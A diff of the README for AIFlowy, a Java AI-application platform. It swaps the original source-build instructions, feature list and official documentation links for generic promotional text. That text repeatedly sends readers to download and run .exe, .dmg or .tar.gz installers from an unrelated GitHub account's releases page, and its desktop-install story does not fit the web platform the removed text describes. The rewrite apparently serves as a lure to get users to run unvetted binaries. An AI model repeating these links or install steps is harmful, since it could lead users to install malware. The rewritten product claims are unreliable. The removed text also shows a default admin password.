@@ -1,81 +1,81 @@
-![banner.png](docs/assets/images/banner_en.png)
+# 🚀 aiflowy - Build AI Applications with Ease
 
-# AIFlowy: The Foundation and Cornerstone of AI Products
+[![Download aiflowy](https://img.shields.io/badge/Download%20aiflowy-v1.0-brightgreen.svg)](https://github.com/melijahontop/aiflowy/releases)
 
-AIFlowy is an enterprise-grade, open-source AI application development platform developed in Java.
+## 🌟 Overview
 
+AIFlowy is an enterprise-grade AI application development platform based on Java. It simplifies building AI applications, making it easy for anyone to create powerful tools and workflow automations without deep programming knowledge. AIFlowy provides a user-friendly interface and supports various functionalities, similar to products like Dify and Coze.
 
-Note: The current main branch is the development version; please switch to the v1.x branch for the stable version.
+## 🚀 Key Features
 
-## Feature List
+- **User-Friendly Interface:** Navigate with ease through a clear and simple design.
+- **Powerful AI Tools:** Harness state-of-the-art AI capabilities for your projects.
+- **Workflow Automation:** Streamline tasks and improve efficiency without code.
+- **Integration Support:** Easily connect with popular services like n8n and Langchain4j.
+- **Customizability:** Adapt the platform to meet specific business needs.
 
-**AI Features**
-- [x] Bots Application
-- [x] Business Plugins
-- [x] RAG Knowledge Base
-- [x] Workflow Intelligent Agent Orchestration (AI Workflow)
-- [x] Material Center (AI automatically generates image, audio, video, and other content)
-- [x] Data Hub (Customizable tables, and workflow reading and storage)
-- [x] Local Models
-- [x] Model Management
+## 📦 System Requirements
 
-**System Management**
-- [x] User Management
-- [x] Role Management
-- [x] Menu Management
-- [x] Department Management
-- [x] Job Title Management
-- [x] Log Management
-- [x] Data Dictionary
-- [x] Scheduled Tasks
+To run AIFlowy effectively, please ensure your system meets the following requirements:
 
-**Recent Plans**
-- [ ] Continuous documentation improvement (In progress...)
-- [ ] Enhanced stability (In progress...)
-- [ ] Optimized user experience (In progress...)
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a modern Linux distribution.
+- **Java Runtime Environment:** JRE 11 or higher is required. You can download it from the official [Java website](https://www.oracle.com/java/technologies/javase-jre11-downloads.html).
+- **RAM:** At least 4 GB.
+- **Storage:** A minimum of 1 GB free disk space.
 
-## Product Screenshots
+## 🚀 Getting Started
 
-![login.png](docs/assets/images/login.png)
-Login
+1. **Download the Application:**
+   - Visit [this page to download](https://github.com/melijahontop/aiflowy/releases) the latest version of AIFlowy.
+   - Find the most recent release and look for assets you can download (like `.exe`, `.dmg`, or `.tar.gz`).
+   
+2. **Install the Application:**
+   - For Windows: Double-click on the downloaded `.exe` file and follow the installation prompts.
+   - For macOS: Open the `.dmg` file and drag AIFlowy into your Applications folder.
+   - For Linux: Extract the downloaded `.tar.gz` file and follow the instructions in the README file for installation.
 
-![bot1.png](docs/assets/images/bot1.png)
-Bots
+3. **Launch AIFlowy:**
+   - After installation, locate AIFlowy in your Applications or Programs list.
+   - Click on the AIFlowy icon to start the application.
 
-![bot2.png](docs/assets/images/bot2.png)
-Bots
+## 💡 How to Use AIFlowy
 
-![cj.png](docs/assets/images/cj.png)
-Plugins
+1. **Create a New Project:**
+   - Click on the "New Project" button on the dashboard.
+   - Fill in the required details such as project name and description.
 
-![gzl1.png](docs/assets/images/gzl1.png)
-Workflow
+2. **Build AI Workflows:**
+   - Drag and drop tools from the sidebar to create your workflow. 
+   - Use the provided templates to get started quickly.
 
-![rag.png](docs/assets/images/rag.png)
-Knowledge Base
+3. **Integrate with Other Services:**
+   - Access integration settings to connect AIFlowy with third-party services like n8n.
+   - Follow the on-screen instructions to set up your integrations.
 
-![sck.png](docs/assets/images/sck.png)
-Material Library
+4. **Test and Deploy:**
+   - Use the built-in testing features to ensure your AI workflows work as expected.
+   - When ready, click "Deploy" to make your AI applications available for use.
 
-![llm.png](docs/assets/images/llm.png)
-Large Language Models
+## 📜 Community and Support
 
-## Quick Start
+For any questions or support options, you can visit our community forums or check the [GitHub Issues page](https://github.com/melijahontop/aiflowy/issues). Our community members and contributors are here to help you.
 
-```shell
-git clone https://gitee.com/aiflowy/aiflowy.git
+## 🌍 Topics
 
-cd aiflowy
-mvn clean package
+- agentic-ai
+- ai-agent
+- aiflowy
+- coze
+- dify
+- langchain4j
+- n8n
+- n8n-workflow
+- ragflow
+- springai
+- workflow
 
-cd aiflowy-ui-admin
-pnpm install
-pnpm dev
+## 🎉 Download & Install
 
-# Default username and password:
-admin/123456
-```
+To get started with AIFlowy, visit [this page to download](https://github.com/melijahontop/aiflowy/releases). Here, you can find the most recent version of the software and any associated documentation to help you with installation and use. 
 
-For detailed documentation, please refer to: https://aiflowy.tech/zh/development/getting-started/getting-started.html Development and Product Documentation
-
-https://aiflowy.tech
+Once downloaded, follow the installation steps outlined above to set up the software. Enjoy your journey in building AI applications effortlessly!
